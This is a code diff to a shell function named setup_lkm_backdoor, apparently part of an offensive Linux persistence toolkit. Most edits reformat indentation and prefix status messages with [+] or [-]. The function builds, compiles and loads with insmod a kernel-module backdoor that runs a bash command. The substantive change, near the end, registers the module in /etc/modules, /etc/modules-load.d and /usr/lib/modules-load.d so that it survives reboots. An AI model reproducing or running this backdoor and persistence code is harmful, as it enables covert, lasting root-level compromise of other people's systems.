@@ -130,10 +130,10 @@ setup_lkm_backdoor() {
 		# Ensure proper escaping for C string
 		command="\"/bin/bash\",\"-c\",\"$command\",NULL"
 		lkm_destination="$lkm_path"
-        mkdir -p $(dirname $lkm_destination)
+		mkdir -p $(dirname $lkm_destination)
 	fi
 
-    mkdir -p ${lkm_compile_dir}
+	mkdir -p ${lkm_compile_dir}
 
 	cat <<-EOF > ${lkm_source}
 	#include <linux/module.h>
@@ -176,12 +176,12 @@ setup_lkm_backdoor() {
 	MODULE_DESCRIPTION("LKM Backdoor");
 	EOF
 
-    # Check if the source file was created
-    if [ ! -f "$lkm_source" ]; then
-        echo "Failed to create the kernel module source code at $lkm_source"
-        exit 1
-    else
-		echo "Kernel module source code created: $lkm_source"
+	# Check if the source file was created
+	if [ ! -f "$lkm_source" ]; then
+		echo "[-] Failed to create the kernel module source code at $lkm_source"
+		exit 1
+	else
+		echo "[+] Kernel module source code created: $lkm_source"
 	fi
 
 	# Create the Makefile
@@ -196,11 +196,11 @@ clean:
 	make -C /lib/modules/\$(shell uname -r)/build M=\$(PWD) clean
 EOF
 
-    if [ ! -f "${lkm_compile_dir}/Makefile" ]; then
-		echo "Failed to create the Makefile at ${lkm_compile_dir}/Makefile"
+	if [ ! -f "${lkm_compile_dir}/Makefile" ]; then
+		echo "[-] Failed to create the Makefile at ${lkm_compile_dir}/Makefile"
 		exit 1
-    else
-		echo "Makefile created: ${lkm_compile_dir}/Makefile"
+	else
+		echo "[+] Makefile created: ${lkm_compile_dir}/Makefile"
 	fi
 
 	# Compile the kernel module using make
@@ -208,7 +208,7 @@ EOF
 	make
 
 	if [ $? -ne 0 ]; then
-		echo "Compilation failed. Exiting."
+		echo "[-] Compilation failed. Exiting."
 		exit 1
 	fi
 
@@ -216,18 +216,35 @@ EOF
 	cp ${lkm_compile_dir}/${lkm_name}.ko ${lkm_destination}
 
 	if [ $? -ne 0 ]; then
-		echo "Copying module failed. Exiting."
+		echo "[-] Copying module failed. Exiting."
 		exit 1
 	fi
 
-	echo "Kernel module compiled successfully: ${lkm_destination}"
+	echo "[+] Kernel module compiled successfully: ${lkm_destination}"
 
 	sudo insmod ${lkm_destination}
 	if [[ $? -ne 0 ]]; then
-		echo "Failed to load the kernel module. Check dmesg for errors."
+		echo "[-] Failed to load the kernel module. Check dmesg for errors."
 		exit 1
 	fi
 
-	echo "Kernel module loaded successfully. Check dmesg for the output."
+	# Add kernel module to /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/
+	echo "[+] Adding kernel module to /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/..."
+	if [ -d "/etc/modules-load.d" ]; then
+		echo "${lkm_name}" > /etc/modules-load.d/${lkm_name}.conf
+	fi
+
+	if [ -d "/usr/lib/modules-load.d" ]; then
+		echo "${lkm_name}" > /usr/lib/modules-load.d/${lkm_name}.conf
+	fi
+
+	if [ -f "/etc/modules" ]; then
+		if ! grep -q "^${lkm_name}$" /etc/modules; then
+			echo "${lkm_name}" >> /etc/modules
+		fi
+	fi
+
+	echo "[+] Kernel module loaded successfully. Check dmesg for the output."
+	echo "[+] Kernel module added to /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/"
 	echo "[+] LKM backdoor established!"
 }
